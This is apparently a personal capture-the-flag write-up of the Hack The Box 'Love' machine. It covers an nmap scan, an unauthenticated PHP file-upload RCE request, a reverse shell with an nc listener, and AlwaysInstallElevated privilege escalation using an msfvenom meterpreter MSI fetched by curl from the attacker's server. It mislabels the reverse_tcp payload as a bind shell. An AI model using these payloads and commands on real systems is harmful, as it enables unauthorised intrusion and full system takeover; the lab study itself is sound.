---
title: Hack The Box&#58; Love
permalink: /HTB/Love
layout: default
---
# Love Writeup 
Love is an easy level box on HackTheBox and took quite some time for me to solve as it was the second box that I have tried to solve. It was pretty interesting to solve and I learned some new exploit methods that I could try to use later.

# Walkthrough
First I performed an nmap scan using `nmap -p- <box ip>`. This first identifies the ports in use. You can follow this up with `nmap -sV -sC -A --script=vuln <box ip> -p x,y,z > file.txt` to get a more indepth scan of those running ports and the system itself, but I was too lazy to do that. This second command will also write the results of the scan to a `file.txt` in your current directory so you could reference the scan again later, if necessary. The result of my initial nmap scan showed me that http was running:
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(1).png?raw=true)  
<br />
<br />
Accessing the website I notice that it's titled "Voting System using PHP", so I try to find out if theres an existing exploit for it.
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(2).png?raw=true) 
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(3).png?raw=true) 
<br />
<br />
Accessing the exploit-db link shows an exploit that I can use. Based on the title, it's an exploit for unauthenticated remote code execution, meaning that if it works, I can execute code on the web server without needed any sort of credentials. Further explanation on the vulnerability can be found at:  https://www.cybersecurity-help.cz/vdb/SB2021050511. According to this resource, Unauthenticated RCE is achieved through uploading php files that will be run by the server and stored at the `/images/`directory. The exploit is a in the form of a HTTP POST request
```markdown
POST /admin/candidates_add.php HTTP/1.1
Host: 192.168.1.1
Content-Length: 275
Cache-Control: max-age=0
Origin: http://192.168.1.1
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrmynB2CmGO6vwFpO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.1/admin/candidates.php
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundaryrmynB2CmGO6vwFpO
Content-Disposition: form-data; name="photo"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo exec("whoami"); ?>

------WebKitFormBoundaryrmynB2CmGO6vwFpO
Content-Disposition: form-data; name="add"
```

Reading this post request, if I change the php code being used as the payload (near the bottom, between the angle brackets), I could potentially send a php code for a reverse shell. I decided to use  https://www.revshells.com to generate a PHP Ivan Sincek reverse shell under the IP of my machine and port 4444 (personal preference). I copy and pasted the shell generated from the site and replaced the payload. After sending the post request in Burp, I checked to see it worked.
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(5).png?raw=true) 
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(7).png?raw=true) 
<br />
<br />
Note that I replaced the red `//` in the burp picture with the Ivan Sincek php code. And we can see that it worked. All we have to do now is set up a listener on port 4444 and click the the link to our php code in the `/images/` directory. I set up a listener by running `nc -nvlp 4444` and then clicking `a.php` gives me:
<br />
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(8).png?raw=true) 
<br />
<br />
Sweet, and we're in a Windows machine. Let's check something simple; is AlwaysInstallElevated on? What this policy does is that, if it's on (we can check the registry), it will install any `.msi` files with SYSTEM level privileges. Running the `REG QUERY HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` will tell us if its enabled.
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(9).png?raw=true) 
<br />
<br />
The 0x1 means that the policy is turned on. It's too lit. To abuse this, we can create a malicious msi file that will give us a bind shell, granting us remote access of the machine. Whereas in a remote shell we open a port on our attacking machine and the victim connects to us, a bind shell will have a port open up on the victim while we connect to it. This sounds complicated, but we can use msfvenom to generate it very easily. Running the command `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<port>-f msi > robux.msi` will create the payload. 
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(11).png?raw=true) 
<br />
<br />
We can then set up a http server on our machine that our victim will access to download the file using curl. Run `python3 -m http.server` and `curl <my machine ip>:<port number><path to payload> --output <filename>` on the respective machines. I ran `curl`  in the `\images` so I could just refresh the webpage to see if my payload was uploaded (however you could just use `dir` to check on the reverse shell)
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(12).png?raw=true) 
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(14).png?raw=true) 
<br />
<br />
Now lets check if our payload is there.
<br />
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(15).png?raw=true) 
<br />
<br />
Robux op. Before we run this, we have to remember that we're using a bind shell so we have to connect to the listener that will be active once we run our payload. This can be done through metasploit and running the exploit `multi/handler` and setting our respective `LHOST` and `LPORT`.
<br />
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(17).png?raw=true) 
<br />
<br />
Now lets run the msi file on the compromised host (we can just type out the filename and extension if its in our directory, or write the full path). 
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/love%20(16).png?raw=true) 
<br />
<br />
ggez
-Dylan Tran 9/3/2021
